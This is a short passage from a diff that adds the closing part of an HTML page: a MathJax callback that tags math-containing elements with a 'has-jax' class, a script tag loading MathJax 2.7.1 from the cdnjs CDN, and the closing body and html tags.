+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+</body>
+</html>
